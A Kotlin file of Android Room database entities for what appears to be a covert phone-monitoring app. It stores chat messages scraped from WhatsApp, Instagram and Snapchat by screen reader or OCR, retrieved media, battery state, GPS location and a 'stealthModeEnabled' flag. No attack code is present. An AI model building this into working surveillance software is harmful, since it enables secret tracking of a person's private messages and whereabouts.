package com.example.data

import androidx.room.Entity
import androidx.room.PrimaryKey

@Entity(tableName = "chat_logs")
data class ChatLog(
    @PrimaryKey(autoGenerate = true) val id: Int = 0,
    val contactName: String,
    val messageText: String,
    val timestamp: Long = System.currentTimeMillis(),
    val isOutgoing: Boolean = false,
    val detectionMethod: String = "ScreenReader", // "ScreenReader" or "OCR"
    val isVerifiedScreen: Boolean = true,
    val appSource: String = "WhatsApp" // "WhatsApp", "Instagram", "Snapchat"
)

@Entity(tableName = "media_items")
data class MediaItem(
    @PrimaryKey(autoGenerate = true) val id: Int = 0,
    val fileName: String,
    val fileSize: Long,
    val mimeType: String,
    val timestamp: Long = System.currentTimeMillis(),
    val direction: String, // "Sent" or "Received"
    val retrievalStatus: String = "NotRequested", // "NotRequested", "Requested", "Retrieved"
    val localPath: String? = null,
    val appSource: String = "WhatsApp" // "WhatsApp", "Instagram", "Snapchat"
)

@Entity(tableName = "device_status")
data class DeviceStatus(
    @PrimaryKey val id: Int = 1, // Only 1 record for current status
    val timestamp: Long = System.currentTimeMillis(),
    val isOnline: Boolean = true,
    val batteryPercentage: Int = 85,
    val isCharging: Boolean = false,
    val locationLatitude: Double = 37.7749,
    val locationLongitude: Double = -122.4194,
    val stealthModeEnabled: Boolean = false
)
